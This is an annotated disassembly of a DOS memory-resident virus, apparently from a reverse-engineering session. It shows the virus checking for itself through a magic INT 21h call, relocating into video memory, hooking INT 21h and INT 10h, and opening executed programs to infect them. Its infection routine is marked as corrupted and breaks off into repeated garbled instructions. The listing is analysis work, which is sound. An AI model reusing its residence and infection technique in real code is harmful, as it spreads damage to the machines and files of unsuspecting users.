                            INT10H_OFS:                   ;XREF[3]:     1000:0151(*),1000:0160(*),b7d0:0198(*)
IVT/Int 10h:0...                dw          ??
                            INT10H_SEG:                   ;XREF[1]:     1000:0166(*)
IVT/Int 10h:0...                dw          ??
                            INT21H_OFS:                   ;XREF[3]:     1000:0149(*),1000:0156(*),b7d0:0190(*)
IVT/Int 21h:0...                dw          ??
                            INT21H_SEG:                   ;XREF[1]:     1000:015c(*)
IVT/Int 21h:0...                dw          ??
                            RUNTIME_START:                ;XREF[1]:     1000:0172(*)
File body:100...e90500          JMP         VIRUS_START
File body:100...53              PUSH        BX
                            ORIGINAL_HOST_BYTES:          ;XREF[1]:     1000:016e(*)
File body:100...cd200000        ??[4]
   |_File body:100...[0]             ??          CDh
   |_File body:100...[1]             ??          20h
   |_File body:100...[2]             ??          00h
   |_File body:100...[3]             ??          00h
                            VIRUS_START:                  ;XREF[1]:     1000:0100(j)
File body:100...e80000          CALL        GET_BASE_POINTER
                            GET_BASE_POINTER:             ;XREF[2]:     1000:0108(j),1000:010c(*)
File body:100...5d              POP         BP
File body:100...81ed0b01        SUB         BP,GET_BASE_POINTER
File body:100...b4fe            MOV         AH,MAGIC_NUMBER
File body:100...cd21            INT         0x21
File body:100...fec4            INC         AH
File body:100...7452            JZ          RETURN_TO_HOST
                            ;The MDA (Monochrome Display Adapter) decodes a 32KB region from B000:0000 to B7FF:000F, though only the first 4KB is actual video RAM (mirrored through the full range). This region is present only when an MDA card is installed. On systems with a CGA or VGA adapter but no MDA, this region is typically unmapped and free for use.
File body:100...b800b0          MOV         AX,0xb000
File body:100...8ec0            MOV         ES,AX
File body:100...8ed8            MOV         DS,AX
File body:100...33ff            XOR         DI,DI
File body:100...89fe            MOV         SI,DI
File body:100...ab              STOSW       ES:DI=>MDA video buffer:MDA_VIDEO_BUFFER;Write AX, and re-read it.
File body:100...ad              LODSW       SI=>MDA video buffer:MDA_VIDEO_BUFFER   ;= ??
                            ;The typical behavior of the hardware of that era was for unmapped regions to read as 0xFF or 0xFFFF, due to the data bus lines being left floating with no hardware driving them to a defined value — capacitance from the last bus cycle pulls them high.
File body:100...40              INC         AX
File body:100...0e              PUSH        CS
File body:100...1f              POP         DS
File body:100...7503            JNZ         COMPUTE_DESTINATION                     ;Memory is mapped → MDA is present → ...
File body:100...b801b8          MOV         AX,0xb801                               ;Memory not mapped → Install after th...
                            COMPUTE_DESTINATION:          ;XREF[1]:     1000:0128(j)
File body:100...05c907          ADD         AX,0x7c9
File body:100...8ec0            MOV         ES,AX                                   ;=B7D0 (MDA) or BFCA (CGA), + 100h by...
File body:100...50              PUSH        AX
File body:100...50              PUSH        AX
File body:100...8db60001        LEA         SI,[BP + RUNTIME_START]                 ;Starts copying a few bytes before th...
File body:100...bf0001          MOV         DI,RUNTIME_START                        ;(see above)
File body:100...b92401          MOV         CX,RUNTIME_SIZE
File body:100...f3a5            MOVSW.REP   ES:DI,SI
File body:100...5b              POP         BX
File body:100...07              POP         ES                                      ;Redundant
File body:100...33c0            XOR         AX,AX
File body:100...8ed8            MOV         DS,AX
File body:100...bfb101          MOV         DI,Runtime body:ORIG_INT21H_OFS
File body:100...be8400          MOV         SI,IVT/Int 21h:INT21H_OFS               ;= ??
File body:100...a5              MOVSW       ES:DI,SI
File body:100...a5              MOVSW       ES:DI=>Runtime body:ORIG_INT21H_SEG,SI
File body:100...bf7f01          MOV         DI,Runtime body:INT10_ORIGINAL_VECTOR...
File body:100...be4000          MOV         SI,IVT/Int 10h:INT10H_OFS               ;= ??
File body:100...a5              MOVSW       ES:DI,SI
File body:100...a5              MOVSW       ES:DI,SI
File body:100...c7068400a301    MOV         word ptr [IVT/In...,Runtime body:INT2...;= ??
File body:100...891e8600        MOV         word ptr [IVT/Int 21h:INT21H_SEG],BX    ;= ??
File body:100...c70640007901    MOV         word ptr [IVT/In...,Runtime body:INT1...;= ??
File body:100...891e4200        MOV         word ptr [IVT/Int 10h:INT10H_SEG],BX    ;= ??
                            RETURN_TO_HOST:               ;XREF[1]:     1000:0116(j)
File body:100...0e              PUSH        CS
File body:100...0e              PUSH        CS
File body:100...1f              POP         DS
File body:100...07              POP         ES
File body:100...8db60401        LEA         SI,[BP + ORIGINAL_HOST_BYTES]
File body:100...bf0001          MOV         DI,RUNTIME_START
File body:100...57              PUSH        DI
File body:100...a5              MOVSW       ES:DI,SI
File body:100...a5              MOVSW       ES:DI,SI
File body:100...c3              RET
                            MDA_VIDEO_BUFFER:             ;XREF[2]:     1000:0123(W),1000:0124(R)
MDA video buf...                dw          ??
                            INT10H_HANDLER:               ;XREF[1]:     1000:0160(*)
Runtime body:...80fc00          CMP         AH,SET_VIDEO_MODE
Runtime body:...7405            JZ          REFRESH_ORIG_VECTORS
                            CALL_ORIG_INT10H:             ;XREF[3,2]:   1000:014e(*),b7d0:0195(*),b7d0:01a1(j),1000:014e(*),
                                                          ;             b7d0:0195(*)
Runtime body:...ea00000000      JMPF        LAB_0000_0000
                            REFRESH_ORIG_VECTORS:         ;XREF[1]:     b7d0:017c(j)
Runtime body:...56              PUSH        SI
Runtime body:...57              PUSH        DI
Runtime body:...1e              PUSH        DS
Runtime body:...06              PUSH        ES
Runtime body:...33f6            XOR         SI,SI
Runtime body:...8ec6            MOV         ES,SI
Runtime body:...0e              PUSH        CS
Runtime body:...1f              POP         DS
Runtime body:...bfb101          MOV         DI,ORIG_INT21H_OFS
Runtime body:...be8400          MOV         SI,IVT/Int 21h:INT21H_OFS               ;= ??
Runtime body:...a5              MOVSW       ES:DI,SI
Runtime body:...a5              MOVSW       ES:DI,SI
Runtime body:...bf7f01          MOV         DI,INT10_ORIGINAL_VECTOR_OFS
Runtime body:...be4000          MOV         SI,IVT/Int 10h:INT10H_OFS               ;= ??
Runtime body:...a5              MOVSW       ES:DI,SI
Runtime body:...a5              MOVSW       ES:DI,SI
Runtime body:...07              POP         ES
Runtime body:...1f              POP         DS
Runtime body:...5f              POP         DI
Runtime body:...5e              POP         SI
Runtime body:...ebdb            JMP         CALL_ORIG_INT10H
                            INT21H_HANDLER:               ;XREF[1]:     1000:0156(*)
Runtime body:...3d004b          CMP         AX,LOAD_AND_EXECUTE
Runtime body:...740d            JZ          INFECT_PROGRAM
Runtime body:...80fcfe          CMP         AH,MAGIC_NUMBER
Runtime body:...7503            JNZ         CALL_ORIG_INT21H
Runtime body:...fec4            INC         AH
Runtime body:...cf              IRET
                            CALL_ORIG_INT21H:             ;XREF[1]:     b7d0:01ab(j)
Runtime body:...ea              ??          EAh
                            ORIG_INT21H_OFS:              ;XREF[2]:     1000:0146(*),b7d0:018d(*)
Runtime body:...0000            dw          0h
                            ORIG_INT21H_SEG:              ;XREF[1]:     1000:014d(*)
Runtime body:...0000            dw          0h
                            INFECT_PROGRAM:               ;XREF[1]:     b7d0:01a6(j)
Runtime body:...50              PUSH        AX
Runtime body:...53              PUSH        BX
Runtime body:...51              PUSH        CX
Runtime body:...52              PUSH        DX
Runtime body:...1e              PUSH        DS
Runtime body:...b8023d          MOV         AX,OPEN_FOR_RW
Runtime body:...cd21            INT         0x21
Runtime body:...724b            JC          LAB_b7d0_020c
Runtime body:...93              XCHG        AX,BX
Runtime body:...0e              PUSH        CS
Runtime body:...1f              POP         DS
Runtime body:...b43f            MOV         AH,READ_FROM_FILE
Runtime body:...b90400          MOV         CX,0x4
Runtime body:...ba2402          MOV         DX,FILE_BUFFER
Runtime body:...cd21            INT         0x21
                            ;************************************************************************************************
                            ;*                      From here onwards, the code seems to be corrupted                       *
                            ;************************************************************************************************
Runtime body:...813e3cb90400    CMP         word ptr [0xb93c],0x4
Runtime body:...ba2402          MOV         DX,0x224
Runtime body:...cd21            INT         0x21
Runtime body:...813e3cb9040e    CMP         word ptr [0xb93c],0xe04
Runtime body:...3dcd21          CMP         AX,0x21cd
Runtime body:...724b            JC          LAB_b000_7f2f
Runtime body:...93              XCHG        AX,BX
Runtime body:...0e              PUSH        CS
Runtime body:...1f              POP         DS
Runtime body:...b43f            MOV         AH,READ_FROM_FILE
Runtime body:...b90400          MOV         CX,0x4
Runtime body:...ba2402          MOV         DX,FILE_BUFFER
Runtime body:...cd21            INT         0x21
Runtime body:...813e3cb90400    CMP         word ptr [0xb93c],0x4
Runtime body:...ba2402          MOV         DX,FILE_BUFFER
Runtime body:...cd21            INT         0x21
Runtime body:...813e3cb9040e    CMP         word ptr [0xb93c],0xe04
Runtime body:...3dcd21          CMP         AX,0x21cd
Runtime body:...724b            JC          LAB_b000_7f52
Runtime body:...93              XCHG        AX,BX
Runtime body:...0e              PUSH        CS
Runtime body:...1f              POP         DS
Runtime body:...b43f            MOV         AH,READ_FROM_FILE
                            LAB_b7d0_020c:                ;XREF[1]:     b7d0:01bf(j)
Runtime body:...b90400          MOV         CX,0x4
Runtime body:...ba2402          MOV         DX,FILE_BUFFER
Runtime body:...cd21            INT         0x21
Runtime body:...813e3cb90400    CMP         word ptr [0xb93c],0x4
Runtime body:...ba2402          MOV         DX,FILE_BUFFER
Runtime body:...cd21            INT         0x21
Runtime body:...81              ??          81h
Runtime body:...3e              ??          3Eh    >
Runtime body:...3c              ??          3Ch    <
Runtime body:...b9              ??          B9h
Runtime body:...04              ??          04h
                            FILE_BUFFER:                  ;XREF[5]:     b7d0:01c9(*),b7d0:01ec(*),b7d0:01f7(*),b7d0:020f(*),
                                                          ;             b7d0:021a(*)
Runtime body:...00000000        ??[4]
   |_Runtime body:...[0]             ??          00h
   |_Runtime body:...[1]             ??          00h
   |_Runtime body:...[2]             ??          00h
   |_Runtime body:...[3]             ??          00h